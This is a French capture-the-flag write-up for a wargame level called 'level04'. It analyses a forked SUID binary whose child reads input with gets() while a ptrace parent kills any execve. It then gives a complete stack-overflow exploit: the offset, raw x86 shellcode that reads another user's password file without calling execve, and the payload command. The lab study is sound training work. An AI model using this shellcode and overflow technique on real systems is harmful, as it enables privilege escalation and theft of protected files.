# level04

## 1. Analyse

### Chaînes essentielles (`.rodata`)

```
0x8048903  "Give me some shellcode, k"   ← prompt avant gets() (côté enfant)
0x804891d  "child is exiting..."         ← le parent constate la fin de l'enfant
0x8048931  "no exec() for you"           ← le parent a détecté un execve
```

### Le `fork` : deux chemins

`main` démarre par un **`fork()`** et range le PID retourné dans `0xac(%esp)` :

```asm
80486d6:  call fork
80486db:  mov  %eax,0xac(%esp)           ; pid = fork()
; buffer de 128 octets mis à zéro en 0x20(%esp) :
80486e2:  lea  0x20(%esp),%ebx
80486eb:  mov  $0x20,%edx                ; 0x20 dwords = 32*4 = 128 octets
80486f4:  rep stos %eax,(%edi)
8048709:  cmpl $0x0,0xac(%esp)
8048711:  jne  8048769                   ; pid != 0 → PARENT ; pid == 0 → ENFANT
```

`fork` renvoie `0` dans l'enfant et le PID de l'enfant dans le parent. Le test
`pid != 0` sépare donc les deux rôles.

### L'enfant (`fork()==0`) — la victime

```asm
8048713:  prctl(1, 1)                    ; PR_SET_PDEATHSIG, SIGHUP : meurt si le parent meurt
8048746:  ptrace(0, 0, 0, 0)            ; PTRACE_TRACEME : "mon parent peut me tracer"
804874b:  puts("Give me some shellcode, k")
8048757:  lea  0x20(%esp),%eax
804875e:  call gets                      ; gets(buf)   ← lecture NON bornée
8048763:  jmp  804881a                   ; → fin (ret)
```

L'enfant s'auto-déclare **traçable** par le parent (`PTRACE_TRACEME`), affiche le
prompt, puis lit l'entrée avec **`gets`** dans le buffer de 128 octets. À la fin,
`main` retourne (`ret`).

### Le parent (`fork()!=0`) — le gardien

```asm
8048769:  wait(&status)                  ; status en 0x1c(%esp)
; status & 0x7f == 0  (sortie normale) → "child is exiting..."
; sinon, si tué par un signal           → "child is exiting..."
; sinon (enfant STOPPÉ sous trace) :
80487ba:  ptrace(3, pid, 0x2c, 0)        ; PTRACE_PEEKUSER, offset 0x2c = ORIG_EAX
80487e1:  mov  %eax,0xa8(%esp)           ; = numéro du syscall que l'enfant invoque
80487e8:  cmpl $0xb,0xa8(%esp)           ; 0xb = 11 = execve ?
80487f0:  jne  8048768                   ; non → reboucle sur wait
80487f6:  puts("no exec() for you")
8048814:  kill(pid, 9)                   ; SIGKILL : tue l'enfant
```

Le parent agit en **débogueur** : il attend que l'enfant (traçable) s'arrête,
puis lit via `PTRACE_PEEKUSER` le registre **ORIG_EAX** de l'enfant — qui contient
le **numéro du syscall** en cours. Si ce numéro vaut **11 (`execve`)**, il affiche
`"no exec() for you"` et **tue l'enfant** avec `SIGKILL`.

Les deux `ptrace` ont donc des rôles opposés : côté enfant `PTRACE_TRACEME`
(= « laisse-toi tracer »), côté parent `PTRACE_PEEKUSER` (= « lis les registres
du tracé »).

## 2. Reconnaissance

### La faille : `gets` → débordement de pile

Côté enfant, `gets(buf)` lit depuis stdin **sans aucune limite**, dans un buffer
de seulement **128 octets**. On déborde donc à volonté et on peut **écraser
l'adresse de retour sauvegardée** de `main`. Au `ret`, l'exécution saute où l'on
veut : c'est une injection de shellcode classique (le prompt nous y invite —
« Give me some shellcode »).

L'offset exact entre le début du buffer et l'adresse de retour est à déterminer
**empiriquement** : le prologue fait `and esp,0xfffffff0`, donc l'alignement
décale la distance (même situation qu'en level01).

### Le piège : le gardien interdit `execve`

Un shellcode « classique » `execve("/bin/sh")` **ne marchera pas** : dès que
l'enfant exécute le syscall `execve` (n°11), le parent le voit (`ORIG_EAX == 11`),
affiche `"no exec() for you"` et le **tue**. C'est toute l'astuce du level.

### Ce qu'il faut pour l'exploitation

Il faut un shellcode qui **n'appelle jamais `execve`**. Comme le binaire est SUID
(level05), l'enfant a le droit de lire le fichier de mot de passe du niveau
suivant. Le shellcode doit donc **lire et afficher le fichier directement** :

```
open("/home/users/level05/.pass", O_RDONLY)   ; syscall 5
read(fd, buf, n)                               ; syscall 3
write(1, buf, n)                               ; syscall 4
exit(0)                                        ; syscall 1
```

Aucun de ces syscalls n'est le `11`, donc le gardien ne réagit pas et le contenu
du `.pass` s'affiche. L'exploitation (offset, shellcode sans octet `0x0a`,
placement) fait l'objet de la partie 3.

## 3. Exploitation

Plan : mettre le shellcode « cat le flag » dans une **variable d'environnement**,
récupérer son adresse, puis déborder via `gets` pour écraser l'adresse de retour
avec celle du shellcode.

### Étape 1 — Trouver l'offset du débordement

La faille est dans l'**enfant**, or gdb suit le **parent** par défaut après un
`fork`. On lui dit donc de suivre l'enfant, puis on envoie un motif cyclique
(chaque groupe de 4 octets est unique) pour repérer où tombe l'adresse de retour :

```gdb
$ gdb ./level04
(gdb) set follow-fork-mode child      # ← suivre l'enfant, pas le parent
(gdb) run
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Au `ret`, le programme segfault et **`EIP` contient 4 octets du motif**. On
retrouve leur position dans le motif qui est le **156e position**.

### Étape 2 — Le shellcode, exporté en variable d'environnement

Le shellcode lit `/home/users/level05/.pass` octet par octet et l'écrit sur la
sortie — **sans jamais appeler `execve`** (open=5, read=3, write=4, exit=1) :

```sh
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

Déroulé : `jmp`/`call`/`pop` récupère l'adresse de la chaîne → `open(path, 0)` →
boucle `read(fd, buf, 1)` puis `write(1, buf, 1)` jusqu'à EOF → `exit`. Le
shellcode ne contient **ni octet nul ni `0x0a`**, et le mettre en variable
d'environnement lui donne une **adresse stable** (ASLR désactivé) sans subir la
troncature de `gets` au `\n`.

### Étape 3 — Récupérer l'adresse du `SHELLCODE`

Un petit programme affiche l'adresse de la variable d'environnement
(`/tmp/getenv.c`) :

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("%p\n", getenv("SHELLCODE"));
}
```

On le compile en **32 bits** (même modèle mémoire que la cible) et on le lance :

```sh
gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv            # ex. 0xffffd4e2
```

> ⚠️ L'adresse dépend de la longueur de `argv[0]`. Comme `/tmp/getenv` et
> `./level04` n'ont pas le même nom, l'adresse peut être décalée de quelques
> octets par rapport à la vraie. En cas d'échec, ajuster de ±quelques octets
> (ou préfixer le shellcode d'un *NOP sled* `\x90…` pour absorber l'écart).

### Étape 4 — Construire le payload

On remplit jusqu'à l'offset, puis on écrit l'adresse du `SHELLCODE` (en
**little-endian**) à la place de l'adresse de retour :

```sh
python -c 'print "A"*156 + "<adresse retourné par getenv>"' | ./level04
```

Au `ret`, l'enfant saute dans le `SHELLCODE`, qui lit et affiche le contenu de
`/home/users/level05/.pass`. Le gardien n'appelle jamais `kill` puisqu'aucun
`execve` n'a lieu.